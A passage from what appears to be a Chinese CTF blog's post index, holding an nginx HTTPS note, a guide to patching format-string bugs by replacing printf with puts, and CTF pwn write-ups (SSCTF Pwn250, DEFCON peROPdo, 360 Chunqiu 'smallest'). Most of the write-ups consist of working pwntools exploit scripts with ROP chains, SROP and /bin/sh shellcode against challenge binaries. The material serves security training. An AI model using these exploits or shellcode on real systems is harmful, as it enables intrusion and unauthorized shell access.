class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span>;</span><br><span class="line">                           &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        server &#123;</span><br><span class="line">                listen <span class="number">80</span>;</span><br><span class="line">                server_name www.ctfrank.org ctfrank.org;</span><br><span class="line">                rewrite ^(/.*) https://$server_name$<span class="number">1</span> permanent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>nginx就只监听2个端口，80和443，而80的话，意思就是只要你访问80，我全给你rewrite成https，用户就会自己跳转去访问443</p><p>443的内容，根据访问的内容，比如/就去访问本地8080端口，admin就去访问本地8888端口</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>怎么去patch格式化串漏洞的程序</title>
      <link href="How-to-patch-fmt.html"/>
      <url>How-to-patch-fmt.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>CTF 中Patch 格式化字符串简便的方法</p><h1 id="方法-—–-gt-替换printf-为puts"><a href="#方法-—–-gt-替换printf-为puts" class="headerlink" title="方法 —–&gt; 替换printf 为puts"></a>方法 —–&gt; 替换printf 为puts</h1><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-01.jpg"></a></p><h2 id="0x1-确定计算方法"><a href="#0x1-确定计算方法" class="headerlink" title="0x1 确定计算方法"></a>0x1 确定计算方法</h2><p>由于地址是相对的 所以</p><p><code>新地址 = 目标地址（这里即为 puts的plt地址） - 当前修改指令地址的下一指令地址</code></p><h2 id="0x02-确定目标地址"><a href="#0x02-确定目标地址" class="headerlink" title="0x02 确定目标地址"></a>0x02 确定目标地址</h2><p>在plt 段 可以看到 puts_plt 地址为 0x08048410</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-02.jpg"></a></p><h2 id="0x03-确定当前地址"><a href="#0x03-确定当前地址" class="headerlink" title="0x03 确定当前地址"></a>0x03 确定当前地址</h2><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-03.jpg"></a></p><p>当前指令 <code>call _printf</code>的地址为 0x08048618  下一指令地址为 0x0804861D</p><h2 id="0x04-计算"><a href="#0x04-计算" class="headerlink" title="0x04 计算"></a>0x04 计算</h2><p>计算结果 如果为负数 记得补码~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>puts_plt = <span class="number">0x8048410</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>call_net_addr = <span class="number">0x0804861d</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>offset = puts_plt - call_next_addr</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>offset</span><br><span class="line"><span class="number">-525</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(offset)</span><br><span class="line"><span class="string">&#x27;-0x20d&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">0xffffffff</span><span class="number">-0x20d</span>+<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;0xfffffdf3L&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="0x05-修改"><a href="#0x05-修改" class="headerlink" title="0x05 修改"></a>0x05 修改</h2><p>Edit –&gt; Patch Program –&gt; Change Byte </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-04.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-04.jpg"></a></p><p>E8 是操作码  后四位是偏移 即  又因为高字节在后面~ </p><p><a href="http://oayoilchh.bkt.clouddn.com/17-5-25/54216390.jpg" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-5-25/54216390.jpg"></a></p><p><code>E8 C3 FD FF FF C7 04 24 72 87 04 08 E8 E7 FD FF</code></p><p>我们需要修改 <code>C3 FD FF FF</code>  —&gt; <code>F3 FD FF FF</code></p><p>修改后 F5 伪代码~ </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-05.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-05.jpg"></a></p><h2 id="0x06-保存"><a href="#0x06-保存" class="headerlink" title="0x06 保存"></a>0x06 保存</h2><p>Edit –&gt; Patch Program –&gt; Apply patches to input file</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-06.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/patch-fmt-06.png"></a></p><p>运行情况~</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary </tag>
            
            <tag> patch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017- SSCTF-Pwn250</title>
      <link href="2017-SSCTF-Pwn.html"/>
      <url>2017-SSCTF-Pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>漏洞很简单，栈溢出，如下：</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-ssctf-pwn250-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-ssctf-pwn250-01.png"></a></p><p>方法一：     mprotect 传shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># switches</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">DEBUG = <span class="number">1</span> </span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="comment"># modify this</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    io = process(<span class="string">&#x27;./250&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;#b main&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(sys.argv[<span class="number">1</span>], int(sys.argv[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># define symbols and offsets here</span></span><br><span class="line"></span><br><span class="line">mprotect = <span class="number">0x0806E070</span></span><br><span class="line">main_addr = <span class="number">0x08048886</span></span><br><span class="line">read = <span class="number">0x0806D510</span></span><br><span class="line">stack = <span class="number">0x08049000</span></span><br><span class="line">size = <span class="number">0x1000</span></span><br><span class="line">prop = <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># define exploit function here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;[InPut Data Size]&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;82&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;[YourData]&#x27;</span>)</span><br><span class="line">payload1 = <span class="string">&#x27;A&#x27;</span> * <span class="number">62</span>+p32(mprotect)+p32(main_addr)+p32(stack)+p32(size)+p32(prop)</span><br><span class="line">io.send(payload1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;[InPut Data Size]&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;90&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;[YourData]&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;</span></span><br><span class="line">ssize = len(shellcode)</span><br><span class="line">payload2 = <span class="string">&#x27;A&#x27;</span> * <span class="number">62</span>+p32(read)+p32(stack)+p32(<span class="number">0</span>)+p32(stack)+p32(ssize)+<span class="string">&#x27;THE END!&#x27;</span></span><br><span class="line">io.send(payload2)</span><br><span class="line"><span class="comment">#io.recvuntil(&#x27;THE END!&#x27;)</span></span><br><span class="line">raw_input(<span class="string">&#x27;send?&#x27;</span>)</span><br><span class="line">io.send(shellcode)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure><p>方法二：</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-ssctf-pwn250-02" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-ssctf-pwn250-02"></a></p><p>int 80 起shell   by pxx</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">io</span>):</span></span><br><span class="line">    io.read_until(<span class="string">&quot;]&quot;</span>)</span><br><span class="line">dl_mk_stack_exe = <span class="number">0x080A0AF0</span></span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.i386.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x080e77dc : add ebx, esp ; add dword ptr [edx], ecx ; ret</span></span><br><span class="line">add_ebx_esp = <span class="number">0x080e77dc</span></span><br><span class="line"><span class="comment">#0x080481c9 : pop ebx ; ret</span></span><br><span class="line">p_ebx_ret = <span class="number">0x080481c9</span></span><br><span class="line"><span class="comment">#0x0804f2ea : mov eax, ebx ; pop ebx ; ret</span></span><br><span class="line">mov_eax_ebx_p_ret = <span class="number">0x0804f2ea</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x0806cbb5 : int 0x80</span></span><br><span class="line">p_eax_ret = <span class="number">0x080b89e6</span></span><br><span class="line">p_ebx_ret = <span class="number">0x080481c9</span></span><br><span class="line">p_ecx_ret = <span class="number">0x080df1b9</span></span><br><span class="line">p_edx_ret = <span class="number">0x0806efbb</span></span><br><span class="line">int80_addr = <span class="number">0x0806cbb5</span></span><br><span class="line"></span><br><span class="line">read_addr = <span class="number">0x0806D510</span></span><br><span class="line">bss_addr = <span class="number">0x080ece00</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x3a</span></span><br><span class="line">payload += l32(<span class="number">0</span>)</span><br><span class="line">payload += gen_rop_data(read_addr, [<span class="number">0</span>, bss_addr, <span class="number">8</span>])</span><br><span class="line">payload += l32(p_eax_ret)</span><br><span class="line">payload += l32(<span class="number">0xb</span>)</span><br><span class="line">payload += l32(p_ebx_ret)</span><br><span class="line">payload += l32(bss_addr)</span><br><span class="line">payload += l32(p_ecx_ret)</span><br><span class="line">payload += l32(<span class="number">0</span>)</span><br><span class="line">payload += l32(p_edx_ret)</span><br><span class="line">payload += l32(<span class="number">0</span>)</span><br><span class="line">payload += l32(int80_addr)</span><br><span class="line"></span><br><span class="line">io.writeline(str(<span class="number">1000</span>))</span><br><span class="line">io.read_until(<span class="string">&quot;]&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.gdb_hint()</span><br><span class="line">io.writeline(payload)</span><br><span class="line">io.read_until(<span class="string">&quot;]&quot;</span>)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">io.writeline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">io.interact()</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> SSTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017 DEFCON ---  peROPdo writeup</title>
      <link href="2017-defcon-peROPdo.html"/>
      <url>2017-defcon-peROPdo.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;split-window&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./peropdo&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;peropdo_bb53b90b35dba86353af36d3c6862621.quals.shallweplayaga.me&quot;</span>,<span class="number">80</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attach</span>():</span></span><br><span class="line">    gdb.attach(r,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *0x08048FD0</span></span><br><span class="line"><span class="string">    b *0x08048B4F</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    raw_input(<span class="string">&quot;debug&quot;</span>)<span class="comment">#0x1022</span></span><br><span class="line">    <span class="comment">#cat /proc/sys/kernel/yama/ptrace_scope</span></span><br><span class="line">    <span class="comment">#开启echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</span></span><br><span class="line">    <span class="comment">#关闭echo 1 | sudo tee /proc/sys/kernel/yama/ptrace_scope</span></span><br><span class="line">    <span class="comment">#C-b o 在小窗口中切换</span></span><br><span class="line">    <span class="comment">#http://blog.chinaunix.net/uid-26285146-id-3252286.html</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attach()</span></span><br><span class="line"></span><br><span class="line">int_0x80 = <span class="number">0x08049551</span></span><br><span class="line">pop_eax_ret = <span class="number">0x80e3525</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x0804b1c9</span></span><br><span class="line">pop_ecx_ret = <span class="number">0x080e5ee1</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806f2fa</span></span><br><span class="line">name_addr = <span class="number">0x080ECFC0</span></span><br><span class="line">sub_eax_1_pop_ebx_ret = <span class="number">0x08054cfa</span></span><br><span class="line"></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806f320</span></span><br><span class="line">srop = <span class="number">0x807c069</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">seed = p32(<span class="number">0xea9ad2fe</span>)</span><br><span class="line">name = seed</span><br><span class="line">name += <span class="string">&quot;\x00&quot;</span>*<span class="number">10</span></span><br><span class="line">name += p32(name_addr + <span class="number">4</span> + <span class="number">20</span>)</span><br><span class="line">name += <span class="string">&quot;\x00&quot;</span>*(<span class="number">10</span><span class="number">-4</span>)</span><br><span class="line">name += <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">name += <span class="string">&quot;\x00&quot;</span>*(<span class="number">52</span><span class="number">-20</span><span class="number">-7</span>)</span><br><span class="line">name += p32(pop_eax_ret)</span><br><span class="line">name += p32(<span class="number">0x0e</span>)</span><br><span class="line">name += p32(sub_eax_1_pop_ebx_ret)</span><br><span class="line">name += p32(name_addr + <span class="number">4</span> + <span class="number">20</span>)</span><br><span class="line">name += p32(sub_eax_1_pop_ebx_ret)</span><br><span class="line">name += p32(name_addr + <span class="number">4</span> + <span class="number">20</span>)</span><br><span class="line">name += p32(sub_eax_1_pop_ebx_ret)</span><br><span class="line">name += p32(name_addr + <span class="number">4</span> + <span class="number">20</span>)</span><br><span class="line">name += p32(pop_ecx_ret)<span class="comment">#0x0</span></span><br><span class="line">name += p32(name_addr + <span class="number">4</span> + <span class="number">10</span>)</span><br><span class="line">name += p32(pop_edx_ret)<span class="comment">#0x0</span></span><br><span class="line">name += p32(name_addr + <span class="number">4</span>)</span><br><span class="line">name += p32(int_0x80)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendline(name)</span><br><span class="line">r.recvuntil(<span class="string">&quot;roll?&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;23&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;again?&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;n&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> DEFCON </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017 360春秋杯线上 部分Pwn writeup</title>
      <link href="2017-360chunqiu-online.html"/>
      <url>2017-360chunqiu-online.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="smallest"><a href="#smallest" class="headerlink" title="smallest"></a>smallest</h2><p>这个题Joker湿傅和说有三种解法，我分别学习了其中两种解法。</p><p>题目开了NX，</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-360ichunqiu-oline.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-360ichunqiu-oline.jpg"></a></p><p>这个题，代码量很少，我们从汇编中就能看懂逻辑。</p><p>xor rax ，rax 将rax的值设置为0，之后的将 rax的值作为调用号，即read的调用号为0，读入数据。所以，我们的初步设想就是通过控制rax，修改调用号，调用不同的函数，起初想能不能控制rdx，传入/bin/sh直接起shell，但是，在gadget中，发现了一个致命的问题。</p><p>因为代码少得可怜，能找到gadget也少得可怜，大概也只有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov rsi,rsp</span><br><span class="line"></span><br><span class="line">mov rdi,rax</span><br><span class="line"></span><br><span class="line">mov edi,eax</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>问题就是，想改变rdi，只能改变rax，但是，rax一变 rdi就会变，这样一来调用号也变了，并不能达到我们的目的。所以我们只能用SROP解决这个问题了。</p><h3 id="第一种解法-mprotect"><a href="#第一种解法-mprotect" class="headerlink" title="第一种解法 mprotect"></a>第一种解法 mprotect</h3><p>这种做法是Joker师傅教我的 我也是第一次了解这种方法</p><p>SROP + mprotect + shellcode</p><p>我们通过mprotect，将不可执行的text段，修改为rax，那么我们就可以执行我们的shellcode了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;joker&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./smallest&quot;</span>)</span><br><span class="line"></span><br><span class="line">syscall_addr = <span class="number">0x4000BE</span></span><br><span class="line">start_addr = <span class="number">0x4000B0</span></span><br><span class="line"></span><br><span class="line">payload = p64(start_addr)</span><br><span class="line">payload += p64(start_addr)<span class="comment">#fill</span></span><br><span class="line">payload += p64(start_addr)<span class="comment">#fill</span></span><br><span class="line">r.send(payload)</span><br><span class="line">raw_input(<span class="string">&quot;joker&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write infor leak</span></span><br><span class="line">r.send(<span class="string">&quot;\xb3&quot;</span>)<span class="comment">#write 2 start_addr last byte</span></span><br><span class="line">data = r.recv(<span class="number">8</span>)</span><br><span class="line">data = r.recv(<span class="number">8</span>)</span><br><span class="line">stack_addr = u64(data)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[*]:stack:&#123;0&#125;&quot;</span>.format(hex(stack_addr))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_read</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = stack_addr</span><br><span class="line">frame.rdx = <span class="number">0x300</span></span><br><span class="line">frame.rsp = stack_addr</span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line"></span><br><span class="line">payload = p64(start_addr)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">payload += str(frame)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&quot;joker&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0x4000B3</span>)<span class="comment">#fill</span></span><br><span class="line">payload += p64(<span class="number">0x4000B3</span>)<span class="comment">#fill</span></span><br><span class="line">payload = payload[:<span class="number">15</span>]</span><br><span class="line">r.send(payload)<span class="comment">#set rax=sys_rt_sigreturn</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_mprotect</span><br><span class="line">frame.rdi = (stack_addr&amp;<span class="number">0xfffffffffffff000</span>)</span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">0x7</span></span><br><span class="line">frame.rsp = stack_addr + <span class="number">0x108</span></span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">payload = p64(start_addr)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">payload += str(frame)</span><br><span class="line"></span><br><span class="line">payload += p64(stack_addr + <span class="number">0x108</span> + <span class="number">8</span>)</span><br><span class="line"><span class="comment">#payload += cyclic(0x100)#addr ====&gt; start_addr + 0x108</span></span><br><span class="line">payload += <span class="string">&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span><span class="comment">#shellcode</span></span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&quot;joker&quot;</span>)</span><br><span 